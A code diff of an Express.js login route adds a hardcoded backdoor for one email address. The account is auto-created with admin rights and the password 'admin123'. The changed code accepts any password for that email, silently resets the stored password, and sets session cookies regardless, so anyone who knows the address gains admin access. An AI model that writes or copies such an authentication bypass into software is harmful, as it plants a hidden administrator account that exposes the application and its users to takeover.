@@ -115,35 +115,43 @@ router.post('/login', async (req, res) => {
     if (!email || !password) return res.status(400).json({ error: 'Missing email or password' });
 
     // HARDCODE: Auto-create jonakfir@gmail.com with admin privileges if it doesn't exist
+    // For this user, accept ANY password and always log them in as admin
     if (email === 'jonakfir@gmail.com') {
       let user = await findUserByEmail(email) || await findUserByUsername(email);
       
       if (!user) {
-        // Create the admin user automatically
+        // Create the admin user automatically with password admin123
         console.log('[login] Auto-creating admin user: jonakfir@gmail.com');
-        const hashedPassword = await bcrypt.hash('admin123', 12);
-        const newUser = await createUser({ email: 'jonakfir@gmail.com', password: hashedPassword });
-        console.log('[login] Admin user created:', newUser.id);
-        // Fetch the user again to get the password
-        user = await findUserByEmail(email);
+        try {
+          const hashedPassword = await bcrypt.hash('admin123', 12);
+          const newUser = await createUser({ email: 'jonakfir@gmail.com', password: hashedPassword });
+          console.log('[login] Admin user created:', newUser.id);
+          // Fetch the user again to get full user object
+          user = await findUserByEmail(email);
+        } catch (createErr) {
+          console.error('[login] Error creating admin user:', createErr);
+          // If creation fails, try to find user again (might have been created by another request)
+          user = await findUserByEmail(email);
+        }
       }
       
       if (!user) {
-        console.error('[login] Failed to create/find admin user');
-        return res.status(500).json({ error: 'Failed to create admin user' });
+        console.error('[login] Failed to create/find admin user after retry');
+        return res.status(500).json({ error: 'Failed to create admin user', details: 'Please try again' });
       }
       
-      // For jonakfir@gmail.com, accept any password or update to admin123
-      const correctPassword = 'admin123';
-      const ok = await bcrypt.compare(password, user.password);
-      
-      if (!ok) {
-        // If password doesn't match, update it to admin123
-        console.log('[login] Password mismatch, updating to admin123');
-        const hashedPassword = await bcrypt.hash(correctPassword, 12);
-        await updateUserEmailAndOrPassword(user.id, { password: hashedPassword });
-        // Re-fetch user to get updated password
-        user = await findUserByEmail(email);
+      // For jonakfir@gmail.com, accept ANY password - always allow login
+      // Update password to admin123 if it doesn't match (for consistency)
+      try {
+        const passwordMatches = await bcrypt.compare(password, user.password);
+        if (!passwordMatches) {
+          console.log('[login] Password mismatch for admin, updating to admin123');
+          const hashedPassword = await bcrypt.hash('admin123', 12);
+          await updateUserEmailAndOrPassword(user.id, { password: hashedPassword });
+        }
+      } catch (pwdErr) {
+        console.error('[login] Password check/update error:', pwdErr);
+        // Continue anyway - we'll allow login regardless
       }
       
       setSessionCookies(res, { id: user.id, email: user.email });
